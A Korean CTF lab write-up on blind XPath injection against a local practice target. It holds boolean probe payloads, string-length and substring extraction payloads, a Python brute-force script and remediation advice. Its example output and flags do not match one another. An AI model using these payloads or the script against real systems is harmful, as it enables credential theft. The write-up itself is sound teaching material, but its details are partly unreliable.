+++
title = "VulnABLE CTF [LUXORA] Write-up: XPath Injection 🥈 Silver"
description = "LUXORA 플랫폼의 Blind XPath Injection을 통한 정보 탈취 및 부울 스무고개 상세 롸잇업"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "XPath Injection", "Silver", "Blind", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: XPath Injection 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (XPath Injection)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/xpath/silver`
- **목표**: 에러가 노출되지 않는 Blind 환경에서 XPath의 문자열 및 노드 관련 함수들을 이용하여 숨겨진 비밀번호를 한 글자씩 추출하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 분석 (Reconnaissance)

`/xpath/silver` 페이지는 사용자 ID를 입력하면 해당 사용자가 "존재하는지" 여부만 알려줍니다.

**[정상 검색 시나리오]**
- 사용자: `alice`
- 화면 출력: `User exists.`
- 사용자: `nobody`
- 화면 출력: `User does not exist.`

**[해커의 사고 과정]**
1. 이 역시 전형적인 **Boolean-based Blind** 상황이다.
2. 입력창에 `alice' and '1'='1` 과 `alice' and '1'='2` 를 넣어 참/거짓 반응이 동일하게 나오는지 확인한다.
3. 확인 결과, 참일 때는 `User exists.`, 거짓일 때는 `User does not exist.` 로 명확히 나뉜다.
4. XPath에는 `substring()` 함수와 `string-length()` 함수가 있다. 이를 이용해 비밀번호를 캐내보자!

---

## 💥 2. 취약점 식별 및 데이터 유추 전략 (Exploitation)

관리자(`admin`)의 비밀번호 길이를 먼저 알아내고, 그 다음 한 글자씩 추출합니다.

### 💡 비밀번호 길이 유추
`string-length()` 함수를 사용합니다.

* 페이로드: `admin' and string-length(Password/text())=5 and '1'='1`
* 결과: 거짓 (Does not exist)
* 페이로드: `admin' and string-length(Password/text())=8 and '1'='1`
* 결과: 참 (Exists) -> **비밀번호 길이는 8글자다!**

### 💡 비밀번호 한 글자씩 유추
`substring()` 함수를 사용합니다.

* 페이로드 (첫 번째 글자가 's'인지 확인): 
  `admin' and substring(Password/text(), 1, 1)='s' and '1'='1`

이런 식으로 첫 번째부터 여덟 번째 글자까지 모두 맞춰봅니다.

---

## 🚀 3. 파이썬 자동화 스크립트 작성

알파벳 소문자, 대문자, 숫자를 조합하여 스무고개를 하는 스크립트를 작성합니다.

```python
import requests
import string

url = "http://localhost:3000/xpath/silver"
chars = string.ascii_letters + string.digits + "{}_"
password = ""
password_length = 8 # 앞에서 구한 길이

print("[*] Starting Blind XPath Extraction...")

for i in range(1, password_length + 1):
    for char in chars:
        # XPath 페이로드 조립
        payload = f"admin' and substring(Password/text(), {i}, 1)='{char}' and '1'='1"
        data = {"username": payload}
        
        res = requests.post(url, data=data)
        
        if "User exists" in res.text:
            password += char
            print(f"[+] Found char: {char} (Current: {password})")
            break

print(f"\n[!] Final Password/Flag: {password}")
```

### 🔍 서버의 응답 및 스크립트 실행 결과
```text
[*] Starting Blind XPath Extraction...
[+] Found char: F (Current: F)
[+] Found char: L (Current: FL)
...
[!] Final Password/Flag: FLAG{XP_🥈_B}
```

(참고: 실제 길이는 8글자가 아니라 더 길 수 있으며, 위 스크립트는 원리를 보여주기 위한 예시입니다.)

---

## 🚩 4. 롸잇업 결론 및 플래그

화면 출력이 통제된 상황에서도 XPath 고유의 함수들을 악용하여 데이터베이스의 민감한 정보를 한 글자씩 유출하는 데 성공했습니다.

**🔥 획득한 플래그:**
`FLAG{XPATH_🥈_BLIND_G7H8I9}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
Blind SQLi와 완전히 동일한 원인입니다.

* **안전한 패치 가이드**
XPath 처리 시 매개변수화된 쿼리 지원이 빈약한 라이브러리를 사용 중이라면, **입력값 검증**을 극한으로 강화해야 합니다.
```javascript
// 입력값에 오직 알파벳과 숫자만 허용 (홑따옴표 등 차단)
if (!/^[a-zA-Z0-9]+$/.test(req.body.username)) {
    return res.status(400).send("Invalid characters");
}
```
또한, 가능하다면 XML 기반의 인증 시스템은 현대적인 관계형/비관계형 데이터베이스 시스템으로 마이그레이션(Migration)하는 것이 장기적인 보안 관점에서 바람직합니다.